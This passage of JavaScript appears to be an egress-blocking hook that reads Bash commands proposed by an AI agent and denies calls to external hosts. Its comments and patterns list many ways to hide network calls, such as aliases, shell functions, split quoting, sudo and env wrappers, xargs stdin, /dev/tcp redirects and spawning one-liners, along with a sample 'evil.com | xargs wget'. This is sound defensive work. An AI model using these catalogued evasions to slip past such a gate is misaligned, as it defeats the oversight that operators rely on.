    else if (spec.exec?.has(name)) { const m = /(?:^|[\s;,])\w*proxy\s*=\s*(\S+)/i.exec(v); if (m) addUrl(m[1]) }
    else if (spec.sshOpt?.has(name)) { const m = /^(?:HostName|ProxyJump)\s*[= ]\s*(.+)$/i.exec(v); if (m) for (const p of m[1].split(',')) addUrl(p) }
    else if (spec.proxyValue?.has(name)) { const m = /^[a-z]+:(.+)$/i.exec(v); addUrl(m ? m[1] : v) }
  }
  let listening = false
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<<?|<>)&?$/.test(w)) k++; continue } // redirection
    if (w === '--') continue
    if (spec.stop?.has(w)) break
    if (w.startsWith('--') || (spec.dashLong && w.startsWith('-') && w.length > 1)) {
      const [name, inline] = w.replace(/^--?/, '').split(/=(.*)/s)
      if (spec.listenLong?.has(name)) listening = true
      if (!spec.long.has(name)) continue
      addValue(name, inline !== undefined ? inline : args[++k])
      continue
    }
    if (w.startsWith('-') && w.length > 1) {
      for (let q = 1; q < w.length; q++) {
        if (spec.listen === w[q]) listening = true
        if (!spec.short.has(w[q])) continue
        addValue(w[q], q + 1 < w.length ? w.slice(q + 1) : args[++k])
        break
      }
      continue
    }
    const h = spec.pos ? spec.pos(w, st) : destHost(w) // positional
    st.n++
    if (h) hosts.push(h)
  }
  return listening ? [] : hosts
}
// Every external destination host in a curl argv (the words AFTER `curl`).
export function curlDestinations(args) {
  return argvHosts(args, SPECS.curl).filter((h) => !isLocalHost(h))
}
// socat: the destination is inside the ADDRESS word, `TCP:host:port`, `OPENSSL:host:443,verify=0`,
// `PROXY:proxy:host:port`. Listening addresses (TCP-LISTEN ...) and files / exec / stdio are no egress.
export function socatHosts(args) {
  const hosts = []
  for (const w of args) {
    const m = /^([A-Za-z][A-Za-z0-9-]*):(.*)$/s.exec(w)
    if (!m) continue
    const kw = m[1].toUpperCase()
    if (/LISTEN|RECV|SERVER/.test(kw) || !/^(?:TCP|UDP|SCTP|DCCP|OPENSSL|SSL|DTLS|SOCKS|PROXY|IP|RAWIP)/.test(kw)) continue
    const fields = m[2].split(',')[0].match(/\[[^\]]*\]|[^:]+/g) ?? []
    for (const f of fields.slice(0, Math.max(fields.length - 1, 1))) { const h = destHost(f); if (h) hosts.push(h) } // the last field is the port / protocol
  }
  return hosts
}

// A one-liner whose code SPAWNS a process can run curl / wget inside: `subprocess.run(["curl", ...])`,
// `os.system("wget ...")`, `execSync('curl ...')`, a backtick. The code is not parsed as a program;
// its string literals are read for the two shapes that name a tool: a literal that IS a command line
// (`"curl -s http://x"`) and a literal that heads an argv list (`"curl","-s","http://x"`). A list that
// goes on with something that is not a literal (`json.dumps(...)`) is judged on the literals before
// it, and when none of them is a destination the call is denied: `["curl", url]` hides its host.
// A one-liner that only CARRIES a localhost curl, with an external URL in the payload, still passes.
const SPAWN_PRIMITIVE = /\b(?:subprocess|os\.(?:system|popen|exec\w*|spawn\w*|posix_spawn\w*)|Popen|popen|child_process|exec(?:File)?(?:Sync)?\s*\(|spawn(?:Sync)?\s*\(|system\s*\(|shell_exec|proc_open|passthru|pcntl_exec|Open3|IO\.popen|Bun\.spawn|Deno\.Command)|`[^`]+`/
const TOOL_NAMES = [...ARGV_TOOLS.keys(), 'socat', 'openssl']
const escapeRx = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
const TOOL_ALT = TOOL_NAMES.map(escapeRx).join('|')
const CMD_LINE_START = new RegExp(`^\\s*(?:[\\w.~-]*/)*(?:${TOOL_ALT})(?![\\w.-])`)
function stringLiterals(code) {
  const out = []; let i = 0
  while (i < code.length) {
    const q = code[i]
    if (q !== '"' && q !== "'") { i++; continue }
    let j = i + 1; let value = ''
    while (j < code.length && code[j] !== q) { if (code[j] === '\\' && j + 1 < code.length) { value += code[j + 1]; j += 2 } else { value += code[j]; j++ } }
    out.push({ value, start: i, end: Math.min(j + 1, code.length) })
    i = j + 1
  }
  return out
}
function embeddedCheck(code, depth, vendorHosts, vendorDomains) {
  if (depth >= 4) return null
  const sub = (cmd) => classify(cmd, depth + 1, vendorHosts, vendorDomains)
  for (const m of code.matchAll(/`([^`]+)`/g)) { const r = sub(m[1]); if (r.deny) return r }
  const lits = stringLiterals(code)
  for (let x = 0; x < lits.length; x++) {
    const v = lits[x].value
    if (CMD_LINE_START.test(v)) { const r = sub(v); if (r.deny) return r }
    const head = v.split('/').pop()
    if (!TOOL_NAMES.includes(head)) continue
    // the literals that follow the head in the same list / call, up to the first non-literal element
    const words = []; let pos = lits[x].end; let y = x + 1
    const lead = /^\s*,?\s*\[?\s*/.exec(code.slice(pos))
    pos += lead[0].length
    while (y < lits.length && lits[y].start === pos) {
      words.push(lits[y].value); pos = lits[y].end
      const sep = /^\s*,\s*/.exec(code.slice(pos))
      if (!sep) break
      pos += sep[0].length; y++
    }
    const open = !/^\s*(?:[\])]|$)/.test(code.slice(pos))
    const r = sub([head, ...words].map(shq).join(' '))
    if (r.deny) return r
    const spec = ARGV_TOOLS.get(head)
    if (open && spec && argvHosts(words, spec).length === 0) return { deny: true, reason: 'one-liner-unresolved-destination', hosts: [] }
  }
  return null
}

// Wrappers that run another command: the real command word is behind them, with or without flags.
// `v` lists the short letters that take a separate value, `long` the long names, `positional` the
// number of plain arguments before the command (timeout DURATION).
const WRAPPERS = {
  // env -S / --split-string VALUE execs a command line: it is split and read as the command itself.
  env: { v: 'uCS', long: names('unset chdir split-string'), splitFlag: 'S', splitLong: 'split-string' },
  sudo: { v: 'ughpCrtUDRT', long: names('user group host prompt close-from role type other-user chdir chroot command-timeout'), shellRestFlags: 'si' },
  doas: { v: 'uC', long: new Set() },
  command: { v: '', long: new Set() },
  exec: { v: 'a', long: new Set() },
  time: { v: 'fo', long: names('format output') },
  nohup: { v: '', long: new Set() },
  nice: { v: 'n', long: names('adjustment') },
  ionice: { v: 'cnpt', long: names('class classdata pid') },
  stdbuf: { v: 'ioe', long: names('input output error') },
  setsid: { v: '', long: new Set() },
  caffeinate: { v: 'tw', long: new Set() },
  unbuffer: { v: '', long: new Set() },
  chronic: { v: '', long: new Set() },
  busybox: { v: '', long: new Set() },
  toybox: { v: '', long: new Set() },
  builtin: { v: '', long: new Set() },
  timeout: { v: 'ks', long: names('kill-after signal'), positional: 1 },
  xargs: { v: 'ILnPsdEaJRS', long: names('max-args max-procs max-chars delimiter arg-file process-slot-var') },
  chroot: { v: '', long: names('userspec groups'), positional: 1 },
  // These run their operand THROUGH A SHELL: the words are joined and read as a shell command line.
  watch: { v: 'n', long: names('interval'), shellJoin: true },
  // `-c COMMAND` is a shell command line, wherever it stands among the arguments.
  su: { v: 'csgGw', long: names('command shell group supp-group whitelist-environment'), shellFlag: 'c', shellLong: 'command', scanAll: true, alwaysEnds: true },
  runuser: { v: 'cugGs', long: names('command user group supp-group shell'), shellFlag: 'c', shellLong: 'command', scanAll: true },
  script: { v: 'cFEIOBmoT', long: names('command'), shellFlag: 'c', shellLong: 'command', scanAll: true, positionalUnlessShell: 1 },
  flock: { v: 'wEc', long: names('timeout wait conflict-exit-code command'), shellFlag: 'c', shellLong: 'command', scanAll: true, positionalUnlessShell: 1 },
}
const assignment = (w) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(w)
// Skips a wrapper's own flags. Returns where its operand starts (`i`), the shell command lines it
// carries (`inline`, to be classified as commands), whether nothing is left to run (`ends`), and an
// env -S value (`split`) whose words replace the wrapper and become the command.
function skipWrapper(ow, from, spec) {
  let i = from; let split = null; let shellRest = false
  const inline = []
  while (i < ow.length) {
    const x = ow[i]
    if (x === '--') { i++; break }
    if (x.startsWith('--') && x.length > 2) {
      const [nm, inl] = x.slice(2).split(/=(.*)/s)
      const takes = spec.long.has(nm)
      const val = inl !== undefined ? inl : takes ? ow[i + 1] : undefined
      if (val !== undefined && spec.shellLong === nm) inline.push(val)
      if (val !== undefined && spec.splitLong === nm) split = val
      i += inl === undefined && takes ? 2 : 1
      if (split !== null) break
      continue
    }
    if (/^-[^-]/.test(x)) {
      let consumed = false
      for (let q = 1; q < x.length; q++) {
        if (spec.shellRestFlags?.includes(x[q])) shellRest = true
        if (!spec.v.includes(x[q])) continue
        const val = q + 1 < x.length ? x.slice(q + 1) : ow[i + 1]
        if (val !== undefined && spec.shellFlag === x[q]) inline.push(val)
        if (val !== undefined && spec.splitFlag === x[q]) split = val
        consumed = q + 1 >= x.length
        break
      }
      i += consumed ? 2 : 1
      if (split !== null) break
      continue
    }
    break
  }
  if (split !== null) return { i, inline, ends: false, split }
  if (spec.scanAll) {
    for (let j = from; j < ow.length; j++) {
      const x = ow[j]
      if ((x === '-c' || x === '--command') && ow[j + 1] !== undefined) inline.push(ow[j + 1])
      else if (x.startsWith('--command=')) inline.push(x.slice(10))
      else if (/^-[A-Za-z]+c$/.test(x) && ow[j + 1] !== undefined) inline.push(ow[j + 1])
    }
  }
  const uniq = [...new Set(inline)]
  const skip = (spec.positional ?? 0) + (uniq.length ? 0 : spec.positionalUnlessShell ?? 0)
  i = Math.min(i + skip, ow.length)
  if (shellRest || spec.shellJoin) uniq.push(ow.slice(i).join(' '))
  return { i, inline: uniq, ends: Boolean(spec.alwaysEnds || spec.shellJoin || shellRest || (spec.shellFlag && uniq.length)), split: null }
}
// The index of the real command word in a word list (in the list returned, which differs from the
// input when an env -S value was spliced in), or -1; `viaXargs` when xargs stood in front (its input
// comes from stdin, which this hook cannot read); `inline` = shell command lines a wrapper carried.
function commandIndex(ow) {
  let k = 0; let viaXargs = false; const inline = []
  for (;;) {
    const w = ow[k]
    if (w === undefined) return { ow, k: -1, viaXargs, inline }
    if (assignment(w)) { k++; continue }
    if (PREFIX_WORDS.has(w)) { k++; continue }
    const base = w.split('/').pop()
    if (Object.hasOwn(WRAPPERS, base)) {
      if (base === 'xargs') viaXargs = true
      const r = skipWrapper(ow, k + 1, WRAPPERS[base])
      inline.push(...r.inline)
      if (r.split !== null) {
        const sub = commandIndex([...shellWords(r.split), ...ow.slice(r.i)])
        return { ...sub, viaXargs: viaXargs || sub.viaXargs, inline: [...inline, ...sub.inline] }
      }
      if (r.ends) return { ow, k: -1, viaXargs, inline }
      k = r.i; continue
    }
    return { ow, k, viaXargs, inline }
  }
}

// ---- aliases, functions, a command name in a variable ------------------------------------------
// `alias c=curl; c https://x` and `c(){ curl "$@"; }; c https://x` hide the tool name behind a word
// this hook has never heard of. Definitions made in the SAME command line are collected and a call to
// the defined name is judged as what it expands to: an alias is replaced by its value, a function body
// is read with "$@", $* and $1..$9 replaced by the call's arguments. A command word that stays
// unresolved (a $VAR nobody assigned here, a $(...) or backtick) next to an external-looking URL or
// host argument is denied: the tool cannot be known, the destination can.
function shq(w) { return `'${String(w).replace(/'/g, "'\\''")}'` }
const FILE_EXT = new Set('txt json md sh py js ts mjs cjs log csv yml yaml html htm png jpg jpeg gif svg pdf zip tar gz tgz bz2 xz conf cfg ini toml xml sql db lock bak tmp map css jsx tsx rb pl php java go rs c h cc cpp hpp o a so dylib exe bin dat out err pid sock key pem crt cer env'.split(' '))
function externalHostOf(w, isExt) {
  const u = (String(w).match(URL_RE) ?? [])[0]
  if (u) { const h = hostOf(u); return h && isExt(h) ? h : null }
  if (w.startsWith('-')) return null
  const h = destHost(w)
  if (!h || !/^(?:[a-z0-9-]+\.)+[a-z]{2,}$/.test(h) || FILE_EXT.has(h.split('.').pop())) return null
  return isExt(h) ? h : null
}
function substituteParams(body, args) {
  const all = args.map(shq).join(' ')
  return body
    .replace(/"\$[@*]"|\$[@*]|"\$\{[@*]\}"|\$\{[@*]\}/g, () => all)
    .replace(/\$\{?([1-9])\}?/g, (_, d) => args[Number(d) - 1] ?? '')
    .replace(/\$#/g, String(args.length))
}
// Function definitions in the MASKED text: `name() {`, `name () {`, `function name {`, `function name() {`,
// and the other compound bodies bash accepts: `name() ( ... )`, `name() if ...; fi`, `for`, `while`,
// `until`, `case`, `select`, `[[ ... ]]`, `(( ... ))`. A brace or parenthesis body is cut at its matching
// close; any other body runs to the end of the command line (a superset: it can only add commands that
// are judged anyway, never hide one).
function collectFunctions(orig, masked) {
  const funcs = new Map()
  const rxs = [
    /(?:^|[\s;&|(){])(?:function\s+)?([A-Za-z_][\w:.-]*)\s*\(\s*\)\s*/g,
    /(?:^|[\s;&|(){])function\s+([A-Za-z_][\w:.-]*)\s*/g,
  ]
  const matchClose = (open, close, from) => {
    let depth = 1; let j = from + 1
    while (j < masked.length && depth > 0) { if (masked[j] === open) depth++; else if (masked[j] === close) depth--; j++ }
    return j
  }
  for (const [ri, rx] of rxs.entries()) {
    for (const m of masked.matchAll(rx)) {
      const at = m.index + m[0].length
      const ch = masked[at]
      if (ch === undefined || (ri === 1 && ch === '(')) continue // `function c()` is the first pattern's
      let bodyFrom; let bodyTo; let headEnd
      if (ch === '{' || ch === '(') {
        const j = matchClose(ch, ch === '{' ? '}' : ')', at)
        bodyFrom = at + 1; bodyTo = j - 1; headEnd = at + 1
        if (bodyTo > masked.length || masked[bodyTo] !== (ch === '{' ? '}' : ')')) bodyTo = orig.length
      } else if (/^(?:if|for|while|until|case|select|\[\[)(?![\w-])/.test(masked.slice(at))) {
        bodyFrom = at; bodyTo = orig.length; headEnd = at
      } else continue
      funcs.set(m[1], { body: orig.slice(bodyFrom, bodyTo), head: [m.index, headEnd] })
    }
  }
  return funcs
}
function collectAliases(orig, masked, env) {
  const aliases = new Map()
  for (const [a, b] of spans(masked)) {
    const { ow, k } = commandIndex(shellWords(expand(orig.slice(a, b), env)))
    if (k === -1 || ow[k] !== 'alias') continue
    for (const w of ow.slice(k + 1)) { const m = /^([^=\s]+)=([\s\S]*)$/.exec(w); if (m) aliases.set(m[1], m[2]) }
  }
  return aliases
}
// A command that cannot be PARSED (an unterminated quote or heredoc) is not judged blind: when it
// carries anything network-capable, a covered tool, a URL, /dev/tcp, an interpreter or shell with a
// code flag, it is denied. A command with none of those may still pass.
const NETWORK_TOKEN = new RegExp(
  `(?:^|[^\\w.-])(?:${[...TOOL_NAMES, 'osascript', 'awk', 'gawk', 'eval'].map(escapeRx).join('|')})(?![\\w.-])` +
  '|[a-z][a-z0-9+.-]*:\\/\\/|\\/dev\\/(?:tcp|udp)\\/' +
  '|\\b(?:python[\\d.]*|node(?:js)?|perl|ruby|php|deno|bun|(?:ba|z|da|k|c|tc)?sh)\\b[^\\n]*?\\s-[A-Za-z]*[cerEp]\\b|--eval',
  'i',
)
const SHELL = /^(?:ba|z|da|k|c|tc|fi)?sh$/
const isCodeFlag = (w) => CODE_FLAG.has(w) || (/^-[A-Za-z]{1,4}$/.test(w) && /[ceEp]$/.test(w))
const isShellCFlag = (w) => /^-[A-Za-z]*c[A-Za-z]*$/.test(w)
export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
  const { stripped: orig, inners } = liftSubstitutions(norm)
  if (depth < 4) {
    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
  }
  const masked = maskInertLiterals(orig)
  if (masked === null || masked.length !== orig.length) {
    // FAIL CLOSED: not parseable AND network-capable -> deny; nothing network-capable -> pass.
    return NETWORK_TOKEN.test(norm) ? { deny: true, reason: 'unparseable', hosts: [] } : { deny: false, reason: 'unparseable', hosts: [] }
  }
  const env = collectAssignments(orig, masked)
  const loops = collectLoops(orig, masked, env)
  const external = (hosts) => [...new Set(hosts)].filter((h) => !isLocalHost(h) && !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
  const isExt = (h) => external([h]).length > 0
  const aliases = collectAliases(orig, masked, env)
  const funcs = collectFunctions(orig, masked)
  const inHeader = (a, b) => [...funcs.values()].some((f) => a >= f.head[0] && b <= f.head[1])
  // A command word that cannot be resolved here: a $VAR nobody assigned in this command, a $(...) or a
  // backtick (each substitution is marked with \u0001, the real text is judged on its own above).
  const marked = liftSubstitutions(norm, '\u0001').stripped
  const markedMask = maskInertLiterals(marked)
  if (markedMask !== null && markedMask.length === marked.length) {
    const menv = collectAssignments(marked, markedMask)
    for (const [a, b] of spans(markedMask)) {
      const ms0 = markedMask.slice(a, b)
      if (inHeader(a, b) || /\n/.test(marked.slice(a, b).slice(0, Math.max(ms0.search(/\S/), 0)))) continue
      const { ow, k } = commandIndex(shellWords(expand(marked.slice(a, b), menv).replace(/\$(['"])/g, '$1')))
      if (k === -1) continue
      const w = ow[k]
      if (!(w.includes('\u0001') || (w.includes('$') && !/^\$\{?HOME\}?\//.test(w)))) continue
      const hs = ow.slice(k + 1).map((x) => externalHostOf(x, isExt)).filter(Boolean)
      if (hs.length) return { deny: true, reason: 'unresolved-command-word', hosts: [...new Set(hs)] }
    }
  }
  for (const [a, b] of spans(masked)) {
    if (inHeader(a, b)) continue // `name()` of a function definition is not a call
    const ms = masked.slice(a, b)
    const mw = words(ms)
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged.
    const plain = expand(orig.slice(a, b), env)
    const variants = loopVariants(orig.slice(a, b), env, loops)
    // bash /dev/tcp and /dev/udp: a redirect, not a command, so no tool name gives it away.
    if (/\/dev\/(?:tcp|udp)\//.test(ms)) {
      const hs = [...plain.matchAll(/\/dev\/(?:tcp|udp)\/([^/\s'"]*)\//g)].map((m) => m[1].toLowerCase())
      const bad = hs.filter((h) => h.includes('$') || external([h]).length)
      if (bad.length) return { deny: true, reason: 'dev-tcp-external', hosts: bad }
    }
    // A span that starts with a blanked heredoc body (the tag line that closes it) is read from the
    // masked text only: the body is data, and its first word must not become a command.
    const heredocTail = /\n/.test(orig.slice(a, b).slice(0, Math.max(ms.search(/\S/), 0)))
    for (const text of [plain, ...(variants ?? [])]) {
      // The command word is read from the DEQUOTED words (`c"ur"l`, `\curl`, `'curl'`, `$'curl'`, a
      // loop or assigned variable) behind any wrappers (env, sudo, timeout, xargs, stdbuf, nice ...).
      const ow0 = heredocTail ? mw : shellWords(text.replace(/\$(['"])/g, '$1'))
      const { ow, k, viaXargs, inline } = commandIndex(ow0)
      // A wrapper that hands its operand to a shell (watch, su -c, flock -c, sudo -i ...) or splits a
      // command line (env -S): the line is judged as a command of its own.
      if (depth < 4) for (const line of inline) { const r = classify(line, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
      if (k === -1) continue
      const cmd = ow[k].split('/').pop()
      const rest = ow.slice(k + 1)
      // A call to an alias or function defined in THIS command line is judged as what it expands to.
      if (depth < 4) {
        if (aliases.has(ow[k])) { const r = classify(`${aliases.get(ow[k])} ${rest.map(shq).join(' ')}`, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
        const fn = funcs.get(ow[k])
        if (fn) { const r = classify(substituteParams(fn.body, rest), depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
      }
      if (SHELL.test(cmd) || cmd === 'eval') {
        const j = cmd === 'eval' ? -1 : rest.findIndex(isShellCFlag)
        const inner = cmd === 'eval' ? rest.join(' ') : rest[j + 1]
        if ((cmd === 'eval' || j !== -1) && inner && depth < 4) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
        continue
      }
      let target = null; let found = []
      const spec = ARGV_TOOLS.get(cmd)
      if (spec) {
        // The destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a JSON
        // payload) is data sent to wherever the tool connects, not a destination. The fleet reports PR
        // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole
        // text with URL_RE denied exactly that (upstream #1514 re-review, measured on the merged head).
        target = cmd
        const all = argvHosts(rest, spec)
        // xargs reads its arguments from stdin, which this hook cannot see: `echo evil.com | xargs wget`.
        if (viaXargs && !all.length) return { deny: true, reason: `${cmd}-xargs-stdin`, hosts: [] }
        found = all
      } else if (cmd === 'socat') { target = cmd; found = socatHosts(rest) }
      else if (cmd === 'openssl') {
        const si = rest.findIndex((w) => w === 's_client' || w === 's_time')
        if (si !== -1) { target = cmd; found = argvHosts(rest.slice(si + 1), SPECS.openssl) }
      } else if (/^g?awk$/.test(cmd)) {
        // gawk's /inet/ special files: "/inet/tcp/0/host/80"
        const hs = [...text.matchAll(/\/inet[46]?\/(?:tcp|udp|raw)\/[^/\s'"]*\/([^/\s'"]+)/gi)].map((m) => m[1].toLowerCase())
        if (hs.length) { target = cmd; found = hs }
      } else if (cmd === 'osascript') {
        // `do shell script "..."` runs a shell: URLs and embedded command lines in the script text.
        for (let j = 0; j < rest.length; j++) {
          if (rest[j] !== '-e' || !/do\s+shell\s+script/i.test(rest[j + 1] ?? '')) continue
          target = cmd
          found.push(...[...rest[j + 1].matchAll(URL_RE)].map((m) => hostOf(m[0])).filter(Boolean))
          const r = embeddedCheck(rest[j + 1], depth, vendorHosts, vendorDomains); if (r) return r
        }
      } else if (INTERPRETER.test(cmd)) {
        const ci = rest.findIndex(isCodeFlag)
        if (ci !== -1) {
          // An interpreter one-liner has no argv to read, so its code is scanned with URL_RE ...
          if (NET_PRIMITIVE.test(text)) { target = 'one-liner'; found = [...text.matchAll(URL_RE)].map((m) => hostOf(m[0])).filter(Boolean) }
          // ... and when it spawns a process, the curl / wget argv inside it is read.
          if (SPAWN_PRIMITIVE.test(rest[ci + 1] ?? '')) { const r = embeddedCheck(rest[ci + 1], depth, vendorHosts, vendorDomains); if (r) return r }
        }
      }
      if (!target) continue
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = external(found)
      if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
    }
  }
  return { deny: false, reason: null, hosts: [] }
}

const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl, wget, nc, socat, telnet, ftp, httpie es ' +
  'tarsaik vagy interpreter-egysoros kulso celra, akkor is, ha a cel valtozoban van. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch (e) { process.stderr.write(`bash-egress-parser: unreadable hook payload, DENY: ${e?.message}\n`); process.exit(2) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  let r
  try { r = classify(payload?.tool_input?.command, 0, loadVendorHosts(), loadVendorDomains()) } catch (e) { process.stderr.write(`bash-egress-parser: internal error, DENY: ${e?.message}\n`); process.exit(2) }
  if (r.deny) {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts }) + '\n')
    } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})` } }))
  }
  process.exit(0)
}
